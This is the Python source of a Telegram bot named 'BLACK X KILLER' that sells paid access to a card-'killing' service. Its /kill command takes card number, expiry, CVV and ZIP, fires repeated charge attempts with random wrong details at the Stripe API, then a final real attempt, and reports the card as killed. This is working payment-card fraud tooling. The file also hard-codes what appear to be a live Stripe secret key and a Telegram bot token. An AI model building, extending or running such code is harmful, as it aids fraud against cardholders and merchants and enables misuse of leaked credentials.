import telebot
import random
import string
import time
import requests
from datetime import datetime, timedelta
from telebot import types

# --- [ CONFIGURATION ] ---
BOT_TOKEN = "8903504544:AAHHzCGHzClwFnaDiSNvzvgIcNFBoyKO5pg"
ADMIN_ID = 7962978777
ADMIN_CONTACT_LINK = "t.me/fxz_neil"

bot = telebot.TeleBot(BOT_TOKEN)

# --- [ STORAGE / DATA MODELS ] ---
users_db = {}
redeem_codes = {}
user_credits = {}  
user_states = {}  
pending_verifications = {} # Verification data pipeline pipeline cache

plans = {"Gold": 10, "Platinum": 30, "Diamond": 90}
plans_display = {
    "Gold": "🔱 Gold Plan ($5 = 10 Days)",
    "Platinum": "💥 Platinum Plan ($15 = 30 Days)",
    "Diamond": "💎 Diamond Plan ($35 = 90 Days)"
}

# Plan Prices Map for Dynamic Rendering
plans_prices = {
    "Gold": "$5",
    "Platinum": "$15",
    "Diamond": "$35"
}

settings = {
    "welcome_message": "Welcome to BLACK X KILLER 🔥\n\nAction-oriented 💯 : Instant Kill, flawless precision.\nSpeed ⚡️ : lethal speed (2-5sec.) and pinpoint accuracy.",
    "upi_id": "9999999999@ybl",
    "usdt_address": "🚀 NOT_SET (Use /setusdt command to set)", # Dynamic Live Config
    "usdt_qr_file_id": None,                                   # Dynamic Live Image Cache
    "plans_text": "",
    "welcome_video_id": None
}

# Default Admin Bootstrap
users_db[ADMIN_ID] = {"status": "admin", "expiry": datetime.max, "plan_name": "Admin Lifetime"}

REQUIRED_CHANNEL_ID = "@BLACKXKILLERAURA999"
REQUIRED_GROUP_ID = "@blackxstarkchat"

# --- [ STRIPE SANDBOX GATEWAY ] ---
stripe_api_url = "https://api.stripe.com/v1"
stripe_key     = "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"

def stripe_charge(card, month, year, cvv, zip_code):
    try:
        headers = {"Authorization": f"Bearer {stripe_key}"}
        data = {
            "type": "card",
            "card[number]": card,
            "card[exp_month]": month,
            "card[exp_year]": year,
            "card[cvc]": cvv,
            "billing_details[address][postal_code]": zip_code
        }
        response = requests.post(stripe_api_url, headers=headers, data=data, timeout=10)
        result = response.json()
        if response.status_code == 200 and "id" in result:
            return "approved"
        elif "error" in result:
            return "declined"
        else:
            return "error"
    except Exception:
        return "timeout"

# --- [ ACCESS SYSTEM ENGINE ] ---
def is_admin(user_id): 
    return users_db.get(user_id, {}).get("status") == "admin" or user_id == ADMIN_ID

def has_active_plan(user_id):
    if is_admin(user_id): return True
    user = users_db.get(user_id)
    return user and user.get("expiry") and datetime.now() < user["expiry"]

def register_user(user_id):
    if user_id not in users_db: 
        users_db[user_id] = {"status": "member", "expiry": None, "plan_name": "None"}

def has_access_via_plan_or_credit(user_id):
    if is_admin(user_id): return True
    if has_active_plan(user_id): return True
    if user_id in user_credits:
        cred = user_credits[user_id]
        if cred.get("credits", 0) > 0 and cred.get("expiry") and datetime.now() < cred["expiry"]:
            return True
    return False

def deduct_user_credit_if_applicable(user_id):
    if is_admin(user_id): return
    if has_active_plan(user_id): return
    if user_id in user_credits and user_credits[user_id].get("credits", 0) > 0:
        user_credits[user_id]["credits"] -= 1

def check_user_joined(user_id):
    if is_admin(user_id): return True
    try:
        member_ch = bot.get_chat_member(REQUIRED_CHANNEL_ID, user_id)
        member_gp = bot.get_chat_member(REQUIRED_GROUP_ID, user_id)
        valid_statuses = ['member', 'administrator', 'creator']
        return member_ch.status in valid_statuses and member_gp.status in valid_statuses
    except:
        return True

def edit_message_safely(chat_id, message, text, reply_markup, parse_mode="Markdown"):
    try:
        if message.video or message.content_type == 'video':
            bot.edit_message_caption(caption=text, chat_id=chat_id, message_id=message.message_id, reply_markup=reply_markup, parse_mode=parse_mode)
        else:
            bot.edit_message_text(text=text, chat_id=chat_id, message_id=message.message_id, reply_markup=reply_markup, parse_mode=parse_mode)
    except:
        try: bot.edit_message_text(text=text, chat_id=chat_id, message_id=message.message_id, reply_markup=reply_markup, parse_mode=parse_mode)
        except: pass

# --- [ UI RENDER SCHEMAS ] ---
def get_main_menu_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("💥 KILL", callback_data="btn_kill"),
        types.InlineKeyboardButton("🛒 BUY PLAN", callback_data="btn_buy"),
        types.InlineKeyboardButton("👤 MY STATUS", callback_data="btn_status"),
        types.InlineKeyboardButton("👑 CONTACT OWNER ↗️", url="https://t.me/BLACKXCARDER11"),
        types.InlineKeyboardButton("🆘 CONTACT ADMIN FOR HELP ↗️", url=ADMIN_CONTACT_LINK)
    )
    return markup

def get_post_kill_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("💥 KILL AGAIN", callback_data="btn_kill_again"),
        types.InlineKeyboardButton("🔙 BACK TO MENU", callback_data="back_to_main")
    )
    return markup

def send_force_join_menu(chat_id, message_to_reply=None):
    text = "⚠️ *ACCESS DENIED! MUST JOIN CHANNELS* ⚠️\n\nPlease join our official Channel and Group to use this bot."
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("📢 JOIN CHANNEL ↗️", url="https://t.me/BLACKXKILLERAURA999"),
        types.InlineKeyboardButton("💬 JOIN GROUP ↗️", url="https://t.me/blackxstarkchat"),
        types.InlineKeyboardButton("DONE ✅", callback_data="chk_verification_done")
    )
    if message_to_reply: bot.reply_to(message_to_reply, text, reply_markup=markup, parse_mode="Markdown")
    else: bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")

def send_main_dashboard(chat_id, user_id):
    welcome_text = f"*{settings['welcome_message']}*"
    if settings.get("welcome_video_id"):
        bot.send_video(chat_id, settings["welcome_video_id"], caption=welcome_text, reply_markup=get_main_menu_markup(), parse_mode="Markdown")
    else:
        bot.send_message(chat_id, welcome_text, reply_markup=get_main_menu_markup(), parse_mode="Markdown")

# --- [ CORE OPERATION WORKFLOW ] ---
@bot.message_handler(commands=['kill'])
def kill_command(message):
    uid = message.from_user.id
    register_user(uid)
    
    if not has_access_via_plan_or_credit(uid):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 BACK TO MENU", callback_data="back_to_main"))
        bot.reply_to(message, "❌ *Access Denied!*\nYou do not have an active plan or any credit balance left.", reply_markup=markup, parse_mode="Markdown")
        return

    try:
        raw_text = message.text.strip()
        if raw_text.startswith('/kill'):
            input_raw = raw_text.split()
            if len(input_raw) < 2: raise ValueError
            target_input = input_raw[1]
        else:
            target_input = raw_text
            
        input_data = target_input.split('|')
        if len(input_data) != 5: raise ValueError
        
        card, month, year, cvv, zip_code = input_data
        msg = bot.reply_to(message, "⏳ *CARD KILLING PROCESSING*", parse_mode="Markdown")
        deduct_user_credit_if_applicable(uid)
        
        attempt = 0
        start_time = time.time()
        stages = ["[⏳     ]", "[⏳⏳    ]", "[⏳⏳⏳   ]", "[⏳⏳⏳⏳  ]", "[⏳⏳⏳⏳⏳ ]", "[⏳⏳⏳⏳⏳⏳]"]

        for i in range(4):
            attempt += 1
            fake_cvv, fake_zip = str(random.randint(100, 999)), str(random.randint(10000, 99999))
            fake_month, fake_year = str(random.randint(1, 12)).zfill(2), str(random.randint(25, 30))
            result = stripe_charge(card, fake_month, fake_year, fake_cvv, fake_zip)
            try:
                bot.edit_message_text(
                    f"💳 *STRIPE FLOW IN PROGRESS*\n\nProcessing {stages[i % len(stages)]}\n`[Attempt {attempt}]` Fake charge: `{result}`",
                    chat_id=message.chat.id,
                    message_id=msg.message_id,
                    parse_mode="Markdown"
                )
            except: pass
            time.sleep(1)

        result = stripe_charge(card, month, year, cvv, zip_code)
        duration = round(time.time() - start_time, 2)
        
        status_banner = "💀 *CARD SUCCESSFULLY KILLED!*" if result in ["declined", "approved"] else "❌ *FLOW FINISHED WITH RESPONSE*"
        bot.edit_message_text(
            f"{status_banner}\n\n• Card: `{card}`\n• Status: `{result.upper()}`\n• Duration: `{duration}s`",
            chat_id=message.chat.id,
            message_id=msg.message_id,
            reply_markup=get_post_kill_markup(),
            parse_mode="Markdown"
        )
    except (IndexError, ValueError):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 BACK TO MENU", callback_data="back_to_main"))
        bot.reply_to(message, "❌ *Format Galat Hai!*\nSahi Format: `/kill CARD|MM|YY|CVV|ZIP`", reply_markup=markup, parse_mode="Markdown")

# --- [ COMPLETE ADMIN CONTROL INTERFACE ] ---
@bot.message_handler(commands=['admin'])
def admin_menu(message):
    if not is_admin(message.from_user.id): return
    panel_msg = (
        "👑 *Admin Dashboard Operational*\n\n"
        "*User Framework Management:*\n"
        "• `/makeadmin USER_ID` | `/removeadmin USER_ID`\n"
        "• `/givecredit USER_ID CREDITS DAYS`\n"
        "• `/broadcast MESSAGE_TEXT`\n\n"
        "*Crypto Gateway Configuration Panel:*\n"
        "• `/setusdt YOUR_TRC20_ADDRESS`\n"
        "• `/setusdtqr` *(Send QR photo code with this exact caption)*\n\n"
        "*Configurable Packages System:*\n"
        "• `/addplan Name Days`\n"
        "• `/editplan Name Days`\n"
        "• `/removeplan Name`\n"
        "• `/viewplans` | `/setplantext Custom Text`\n\n"
        "*Dynamic Vouchers Operations:*\n"
        "• `/gencode PlanName`\n"
        "• `/viewcodes`\n\n"
        "*Visual Environment Settings:*\n"
        "• `/setwelcome Plain Text` *(Or send video with /setwelcome)*"
    )
    bot.reply_to(message, panel_msg, parse_mode="Markdown")

@bot.message_handler(commands=['setusdt'])
def admin_set_usdt_address(message):
    if not is_admin(message.from_user.id): return
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ *Format:* `/setusdt YOUR_TRC20_ADDRESS`", parse_mode="Markdown")
            return
        address = parts[1].strip()
        settings["usdt_address"] = address
        bot.reply_to(message, f"✅ *USDT Address Updated Live!*\nNew Address: `{address}`", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ Error tracking: {str(e)}")

@bot.message_handler(commands=['addplan', 'editplan'])
def admin_plan_add_edit(message):
    if not is_admin(message.from_user.id): return
    try:
        parts = message.text.split()
        name, days = parts[1], int(parts[2])
        plans[name] = days
        plans_display[name] = f"🔱 {name} Plan (Custom Validity = {days} Days)"
        bot.reply_to(message, f"✅ Plan `{name}` with `{days}` days processed successfully!")
    except:
        bot.reply_to(message, "❌ *Format:* `/addplan Name Days` or `/editplan Name Days`", parse_mode="Markdown")

@bot.message_handler(commands=['removeplan'])
def admin_remove_plan(message):
    if not is_admin(message.from_user.id): return
    try:
        name = message.text.split()[1]
        if name in plans:
            del plans[name]
            if name in plans_display: del plans_display[name]
            bot.reply_to(message, f"✅ Plan `{name}` removed.")
        else: bot.reply_to(message, "❌ Plan not found.")
    except: bot.reply_to(message, "❌ *Format:* `/removeplan Name`", parse_mode="Markdown")

@bot.message_handler(commands=['setplantext'])
def admin_set_plan_text(message):
    if not is_admin(message.from_user.id): return
    text = message.text.replace('/setplantext', '').strip()
    if text:
        settings["plans_text"] = text
        bot.reply_to(message, "✅ Custom plan text layout updated.")
    else: bot.reply_to(message, "❌ *Format:* `/setplantext text_here`", parse_mode="Markdown")

@bot.message_handler(commands=['gencode'])
def admin_generate_code(message):
    if not is_admin(message.from_user.id): return
    try:
        plan_name = message.text.split()[1]
        if plan_name not in plans:
            bot.reply_to(message, f"❌ Plan `{plan_name}` does not exist.")
            return
        code = "BLK-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
        redeem_codes[code] = {"plan_name": plan_name, "days": plans[plan_name], "used": False}
        bot.reply_to(message, f"🎫 *Voucher Generated!*\nCode: `{code}`\nPlan: `{plan_name}`\n\nRedeem via: `/redeem {code}`", parse_mode="Markdown")
    except: bot.reply_to(message, "❌ *Format:* `/gencode PlanName`", parse_mode="Markdown")

@bot.message_handler(commands=['viewcodes'])
def admin_view_codes(message):
    if not is_admin(message.from_user.id): return
    if not redeem_codes:
        bot.reply_to(message, "ℹ️ No dynamic codes found inside the database pool.")
        return
    lines = ["📋 *Database Active Coupon Vouchers:*"]
    for code, info in redeem_codes.items():
        status = "❌ Used" if info["used"] else "✅ Available"
        lines.append(f"• `{code}` | Plan: `{info['plan_name']}` ({info['days']} Days) [{status}]")
    bot.reply_to(message, "\n".join(lines), parse_mode="Markdown")

@bot.message_handler(commands=['makeadmin', 'removeadmin'])
def admin_mgmt(message):
    if not is_admin(message.from_user.id): return
    try:
        parts = message.text.split()
        cmd, tid = parts[0], int(parts[1])
        users_db[tid] = {"status": "admin", "expiry": datetime.max, "plan_name": "Admin Lifetime"} if cmd == '/makeadmin' else {"status": "member", "expiry": None, "plan_name": "None"}
        bot.reply_to(message, "✅ Target execution permissions toggled successfully!")
    except: bot.reply_to(message, "❌ *Format:* `/makeadmin USER_ID`", parse_mode="Markdown")

@bot.message_handler(commands=['broadcast'])
def admin_broadcast(message):
    if not is_admin(message.from_user.id): return
    try:
        text = message.text.replace('/broadcast', '').strip()
        if not text: raise ValueError
        for uid in list(users_db.keys()):
            try: bot.send_message(uid, f"📢 *BROADCAST ALERT*\n\n{text}", parse_mode="Markdown")
            except: pass
        bot.reply_to(message, "✅ Broadcast execution successfully finalized!")
    except: bot.reply_to(message, "❌ *Format:* `/broadcast MSG_TEXT`")

@bot.message_handler(commands=['setwelcome'])
def set_welcome_text_only(message):
    if not is_admin(message.from_user.id): return
    text = message.text.replace('/setwelcome', '').strip()
    if text:
        settings["welcome_message"] = text
        bot.reply_to(message, "✅ Text welcome status layout updated dynamically!")
    else: bot.reply_to(message, "❌ *Format:* `/setwelcome Text` or upload media with caption.")

@bot.message_handler(commands=['givecredit'])
def grant_credits_command(message):
    if not is_admin(message.from_user.id): return
    try:
        parts = message.text.split()
        target_id, credit_amount, valid_days = int(parts[1]), int(parts[2]), int(parts[3])
        expiry_time = datetime.now() + timedelta(days=valid_days)
        user_credits[target_id] = {"credits": credit_amount, "expiry": expiry_time}
        bot.reply_to(message, f"✅ *Credits Assigned Successfully!*\n👤 ID: `{target_id}`\n💰 Balance: `{credit_amount}`\n⏳ Validity: `{valid_days}` Days", parse_mode="Markdown")
        try: bot.send_message(target_id, f"🎉 *You Received Balance Credits!* Check your status via `/status`", parse_mode="Markdown")
        except: pass
    except: bot.reply_to(message, f"❌ Format: `/givecredit USER_ID CREDITS DAYS`")

# --- [ CLIENT SIDE DEPLOYMENTS ROUTER ] ---
@bot.message_handler(commands=['viewplans', 'status', 'buy', 'redeem'])
def user_cmds(message):
    uid = message.from_user.id
    register_user(uid)
    cmd = message.text.split()[0]
    
    markup_back = types.InlineKeyboardMarkup()
    markup_back.add(types.InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main"))
    
    if cmd == '/viewplans': 
        if settings["plans_text"]: bot.reply_to(message, settings["plans_text"], reply_markup=markup_back)
        else:
            lines = ["📋 *Available Official Plans:* \n"]
            for p in plans_display: lines.append(f"• {plans_display[p]}")
            bot.reply_to(message, "\n".join(lines), reply_markup=markup_back, parse_mode="Markdown")
        
    elif cmd == '/status':
        username = f"@{message.from_user.username}" if message.from_user.username else "No Username"
        
        if has_active_plan(uid): 
            user = users_db[uid]
            plan_name = user.get("plan_name", "Active Plan")
            days_left = "Lifetime" if user['expiry'] == datetime.max else f"{str((user['expiry'] - datetime.now()).days)} Days"
            expiry_str = "Never" if user['expiry'] == datetime.max else user['expiry'].strftime('%Y-%m-%d %H:%M:%S')
            
            status_text = (
                f"👤 *USERNAME:* {username}\n🆔 *USERID:* `{uid}`\n"
                f"🔱 *PLAN:* `{plan_name}`\n⏳ *VALIDITY:* `{days_left}`\n📅 *EXPIRY DATE:* `{expiry_str}`"
            )
        else: 
            cred_info = user_credits.get(uid, {"credits": 0, "expiry": None})
            if cred_info["credits"] > 0 and datetime.now() < cred_info["expiry"]:
                days_left = f"{str((cred_info['expiry'] - datetime.now()).days)} Days"
                status_text = (
                    f"👤 *USERNAME:* {username}\n🆔 *USERID:* `{uid}`\n"
                    f"🔱 *PLAN:* `Credits Balance`\n⏳ *VALIDITY:* `{days_left}`\n💰 *CREDITS:* `{cred_info['credits']}`"
                )
            else:
                status_text = f"👤 *USERNAME:* {username}\n🆔 *USERID:* `{uid}`\n🔱 *PLAN:* `No Active Plan`\n⏳ *VALIDITY:* `0 Days`"
        bot.reply_to(message, status_text, reply_markup=markup_back, parse_mode="Markdown")
            
    elif cmd == '/buy':
        markup = types.InlineKeyboardMarkup(row_width=1)
        for p in plans: markup.add(types.InlineKeyboardButton(plans_display[p], callback_data=f"b_sel_{p}"))
        markup.add(types.InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main"))
        bot.reply_to(message, "🛒 *Select a Plan to Buy:*", reply_markup=markup, parse_mode="Markdown")
        
    elif cmd == '/redeem':
        try:
            code = message.text.split()[1]
            if code in redeem_codes and not redeem_codes[code]["used"]:
                days, pname = redeem_codes[code]["days"], redeem_codes[code]["plan_name"]
                users_db[uid]["expiry"] = datetime.now() + timedelta(days=days)
                users_db[uid]["plan_name"] = pname
                redeem_codes[code]["used"] = True
                bot.reply_to(message, f"✅ *Plan Activated Successfully!*", reply_markup=markup_back, parse_mode="Markdown")
            else: bot.reply_to(message, "❌ *Invalid Code!*", reply_markup=markup_back)
        except: bot.reply_to(message, "❌ Format: `/redeem CODE`", reply_markup=markup_back)

@bot.message_handler(commands=['start'])
def custom_start_handler(message):
    uid = message.from_user.id
    register_user(uid)
    if message.chat.type in ['group', 'supergroup']:
        bot.reply_to(message, "👋 Bot active! Use the `/kill` command directly.")
        return
    if not check_user_joined(uid):
        send_force_join_menu(message.chat.id, message_to_reply=message)
        return
    send_main_dashboard(message.chat.id, uid)

# --- [ INLINE BUTTON ROUTING ENGINE ] ---
@bot.callback_query_handler(func=lambda call: True)
def custom_buttons_callback(call):
    uid = call.from_user.id
    register_user(uid)
    
    if not check_user_joined(uid) and call.data != "chk_verification_done":
        bot.answer_callback_query(call.id, "❌ Join Required Channel/Group first!")
        return

    bot.answer_callback_query(call.id)
    
    # Dynamic Inline Edit Optimization for /kill triggers
    if call.data in ["btn_kill", "btn_kill_again"]:
        user_states[uid] = "waiting_for_kill_input"
        markup_inside = types.InlineKeyboardMarkup()
        markup_inside.add(types.InlineKeyboardButton("🔙 BACK TO MENU", callback_data="back_to_main"))
        
        kill_prompt_text = "📥 *Format:* `CARD|MM|YY|CVV|ZIP`\nType or Paste details below directly into chat now!"
        
        if call.data == "btn_kill_again":
            # Direct dynamic edit inside the exact same menu framework!
            edit_message_safely(chat_id=call.message.chat.id, message=call.message, text=kill_prompt_text, reply_markup=markup_inside, parse_mode="Markdown")
        else:
            bot.send_message(
                call.message.chat.id, 
                kill_prompt_text, 
                reply_to_message_id=call.message.message_id,
                reply_markup=markup_inside,
                parse_mode="Markdown"
            )
        return

    elif call.data == "btn_status":
        username = f"@{call.from_user.username}" if call.from_user.username else "No Username"
        markup_status = types.InlineKeyboardMarkup()
        markup_status.add(types.InlineKeyboardButton("🔙 BACK TO MENU", callback_data="back_to_main"))
        
        if has_active_plan(uid):
            user = users_db[uid]
            plan_name = user.get("plan_name", "Active Plan")
            days_left = "Lifetime" if user['expiry'] == datetime.max else f"{str((user['expiry'] - datetime.now()).days)} Days"
            expiry_str = "Never" if user['expiry'] == datetime.max else user['expiry'].strftime('%Y-%m-%d %H:%M:%S')
            status_text = (
                f"👤 *USERNAME:* {username}\n🆔 *USERID:* `{uid}`\n"
                f"🔱 *PLAN:* `{plan_name}`\n⏳ *VALIDITY:* `{days_left}`\n📅 *EXPIRY DATE:* `{expiry_str}`"
            )
        else:
            cred_info = user_credits.get(uid, {"credits": 0, "expiry": None})
            if cred_info["credits"] > 0 and datetime.now() < cred_info["expiry"]:
                days_left = f"{str((cred_info['expiry'] - datetime.now()).days)} Days"
                status_text = (
                    f"👤 *USERNAME:* {username}\n🆔 *USERID:* `{uid}`\n"
                    f"🔱 *PLAN:* `Credits Balance`\n⏳ *VALIDITY:* `{days_left}`\n💰 *CREDITS:* `{cred_info['credits']}`"
                )
            else:
                status_text = f"👤 *USERNAME:* {username}\n🆔 *USERID:* `{uid}`\n🔱 *PLAN:* `No Active Plan`\n⏳ *VALIDITY:* `0 Days`"
        
        bot.send_message(call.message.chat.id, status_text, reply_to_message_id=call.message.message_id, reply_markup=markup_status, parse_mode="Markdown")
        return

    elif call.data == "back_to_main":
        user_states[uid] = None  
        if settings.get("welcome_video_id"):
            bot.send_video(call.message.chat.id, settings["welcome_video_id"], caption=f"*{settings['welcome_message']}*", reply_markup=get_main_menu_markup(), parse_mode="Markdown")
        else:
            bot.send_message(call.message.chat.id, f"*{settings['welcome_message']}*", reply_markup=get_main_menu_markup(), parse_mode="Markdown")
    
    elif call.data == "chk_verification_done":
        if check_user_joined(uid): send_main_dashboard(call.message.chat.id, uid)
        else: bot.send_message(call.message.chat.id, "⚠️ Join both links first then tap DONE!")
        
    elif call.data == "btn_buy":
        user_states[uid] = None  
        markup = types.InlineKeyboardMarkup(row_width=1)
        for p in plans: markup.add(types.InlineKeyboardButton(plans_display[p], callback_data=f"b_sel_{p}"))
        markup.add(types.InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main"))
        edit_message_safely(chat_id=call.message.chat.id, message=call.message, text="🛒 *Select a Plan to Purchase:*", reply_markup=markup, parse_mode="Markdown")

    elif call.data.startswith("b_sel_"):
        plan_name = call.data.replace("b_sel_", "")
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("💳 Pay with UPI", url=ADMIN_CONTACT_LINK),
            types.InlineKeyboardButton("💵 Pay with USDT", callback_data=f"pay_usdt_{plan_name}"),
            types.InlineKeyboardButton("🔙 Back", callback_data="btn_buy")
        )
        edit_message_safely(chat_id=call.message.chat.id, message=call.message, text=f"💳 *Choose Payment Method for plan: {plan_name}*:", reply_markup=markup, parse_mode="Markdown")

    elif call.data.startswith("pay_usdt_"):
        plan_name = call.data.replace("pay_usdt_", "")
        price = plans_prices.get(plan_name, "$5")
        
        usdt_text = (
            f"💵 *USDT PAYMENT CHECKOUT* 💵\n\n"
            f"📦 *Plan Selected:* `{plan_name} Plan`\n"
            f"💰 *Price Amount:* `{price} USDT`\n"
            f"🔗 *Network Protocol:* `TRC20`\n\n"
            f"👇 *USDT Wallet Address Below:* \n`{settings['usdt_address']}`\n\n"
            f"📢 *Instructions:* Transfer amount via TRC-20 Network, scan QR Code or copy Address, then tap the verify payment button below."
        )
        
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("Verify Payment ✅", callback_data=f"verify_usdt_{plan_name}"),
            types.InlineKeyboardButton("🔙 Back", callback_data="btn_buy")
        )
        
        if settings["usdt_qr_file_id"]:
            try:
                bot.send_photo(call.message.chat.id, settings["usdt_qr_file_id"], caption=usdt_text, reply_markup=markup, parse_mode="Markdown")
            except:
                bot.send_message(call.message.chat.id, usdt_text, reply_markup=markup, parse_mode="Markdown")
        else:
            bot.send_message(call.message.chat.id, usdt_text + "\n\n⚠️ *(Note: Admin has not uploaded a dynamic QR code photo yet, copy the address directly)*", reply_markup=markup, parse_mode="Markdown")

    elif call.data.startswith("verify_usdt_"):
        plan_name = call.data.replace("verify_usdt_", "")
        user_states[uid] = f"state_proof_photo_{plan_name}"
        bot.send_message(call.message.chat.id, "📸 Please upload your *Payment Screenshot* photo directly into the chat here:", parse_mode="Markdown")

    elif call.data.startswith("submit_done_"):
        token = call.data.replace("submit_done_", "")
        data = pending_verifications.get(token)
        if not data:
            bot.send_message(call.message.chat.id, "❌ Session Expired. Please try verification workflow again.")
            return
        
        bot.send_message(call.message.chat.id, "⏳ *Your request is sent to Admin for manual review!* You will receive an alert message once approved.", parse_mode="Markdown")
        
        username = f"@{call.from_user.username}" if call.from_user.username else "No Username"
        admin_markup = types.InlineKeyboardMarkup(row_width=2)
        admin_markup.add(
            types.InlineKeyboardButton("Approve 👍", callback_data=f"adm_app_{token}"),
            types.InlineKeyboardButton("Decline ❌", callback_data=f"adm_dec_{token}")
        )
        
        admin_text = (
            f"🔔 *NEW INCOMING PAYMENT PROOF* 🔔\n\n"
            f"🆔 *User ID:* `{data['user_id']}`\n"
            f"👤 *Username:* {username}\n"
            f"📦 *Plan Requested:* `{data['plan_name']}`\n"
            f"🔗 *Sender Hash/Address:* `{data['wallet_hash']}`"
        )
        bot.send_photo(ADMIN_ID, data['photo_id'], caption=admin_text, reply_markup=admin_markup, parse_mode="Markdown")

    elif call.data.startswith("adm_app_"):
        token = call.data.replace("adm_app_", "")
        data = pending_verifications.get(token)
        if data:
            target_uid = data["user_id"]
            pname = data["plan_name"]
            days = plans.get(pname, 10)
            
            register_user(target_uid)
            users_db[target_uid]["expiry"] = datetime.now() + timedelta(days=days)
            users_db[target_uid]["plan_name"] = pname
            
            bot.send_message(ADMIN_ID, f"✅ Access granted successfully to user `{target_uid}` for plan `{pname}`.")
            try: bot.send_message(target_uid, f"🎉 *Your payment was APPROVED!* `{pname} Plan` ({days} Days) is now activated. Use bot functions now!", parse_mode="Markdown")
            except: pass
            del pending_verifications[token]
            
    elif call.data.startswith("adm_dec_"):
        token = call.data.replace("adm_dec_", "")
        data = pending_verifications.get(token)
        if data:
            target_uid = data["user_id"]
            bot.send_message(ADMIN_ID, f"❌ Request for user `{target_uid}` declined.")
            try: bot.send_message(target_uid, "❌ *Your Payment Proof was DECLINED by Admin!* Please double check details or contact support for manual assistance.", parse_mode="Markdown")
            except: pass
            del pending_verifications[token]

# --- [ DATA ROUTER & MESSAGES CAPTURE ENGINE ] ---
@bot.message_handler(content_types=['photo', 'text', 'video'])
def global_input_router(message):
    uid = message.from_user.id
    register_user(uid)
    
    if is_admin(uid) and message.content_type == 'photo' and message.caption and message.caption.startswith('/setusdtqr'):
        try:
            photo_file_id = message.photo[-1].file_id
            settings["usdt_qr_file_id"] = photo_file_id
            bot.reply_to(message, "✅ *Dynamic USDT QR Image updated perfectly inside memory bank live!*", parse_mode="Markdown")
            return
        except Exception as e:
            bot.reply_to(message, f"❌ Error setting QR configuration: {str(e)}")
            return
            
    current_state = user_states.get(uid, "")
    
    if current_state.startswith("state_proof_photo_"):
        if message.content_type != 'photo':
            bot.reply_to(message, "❌ Invalid item, please upload a valid *Photo Screenshot*!")
            return
        plan_name = current_state.replace("state_proof_photo_", "")
        photo_id = message.photo[-1].file_id
        
        token = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
        pending_verifications[token] = {
            "user_id": uid,
            "plan_name": plan_name,
            "photo_id": photo_id,
            "wallet_hash": "Pending submission"
        }
        
        user_states[uid] = f"state_proof_hash_{token}"
        bot.reply_to(message, "✅ Screenshot received! Now type or paste your *USDT Wallet Address / Transaction Hash* below:")
        return

    elif current_state.startswith("state_proof_hash_"):
        if message.content_type != 'text':
            bot.reply_to(message, "❌ Please send your transaction hash string in text format:")
            return
        token = current_state.replace("state_proof_hash_", "")
        if token in pending_verifications:
            pending_verifications[token]["wallet_hash"] = message.text.strip()
            user_states[uid] = None
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("DONE ✅", callback_data=f"submit_done_{token}"))
            bot.reply_to(message, "⭐ All verification items structured perfectly. Click the button below to submit data package:", reply_markup=markup, parse_mode="Markdown")
        return

    if is_admin(uid) and message.content_type == 'video' and message.caption and message.caption.startswith('/setwelcome'):
        try:
            caption_text = message.caption.replace('/setwelcome', '').strip()
            settings["welcome_video_id"] = message.video.file_id
            if caption_text: settings["welcome_message"] = caption_text
            bot.reply_to(message, "✅ *Welcome Video setup tracking successfully complete!*", parse_mode="Markdown")
            return
        except Exception as e:
            bot.reply_to(message, f"❌ Error: {str(e)}")
            return
            
    if user_states.get(uid) == "waiting_for_kill_input" and message.content_type == 'text':
        user_states[uid] = None
        if not has_access_via_plan_or_credit(uid):
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🔙 BACK TO MENU", callback_data="back_to_main"))
            bot.reply_to(message, "❌ *Access Denied!*\\nYou do not have an active plan or any credit balance left.", reply_markup=markup, parse_mode="Markdown")
            return
        kill_command(message)  
        return

    if message.chat.type in ['group', 'supergroup']: return

    if message.content_type == 'text' and not message.text.startswith('/'):
        if len(message.text.split('|')) == 5:
            if not has_access_via_plan_or_credit(uid):
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("🔙 BACK TO MENU", callback_data="back_to_main"))
                bot.reply_to(message, "❌ *Access Denied!*\\nYou do not have an active plan or any credit balance left.", reply_markup=markup, parse_mode="Markdown")
            else:
                kill_command(message)
            return

if __name__ == '__main__':
    bot.infinity_polling()
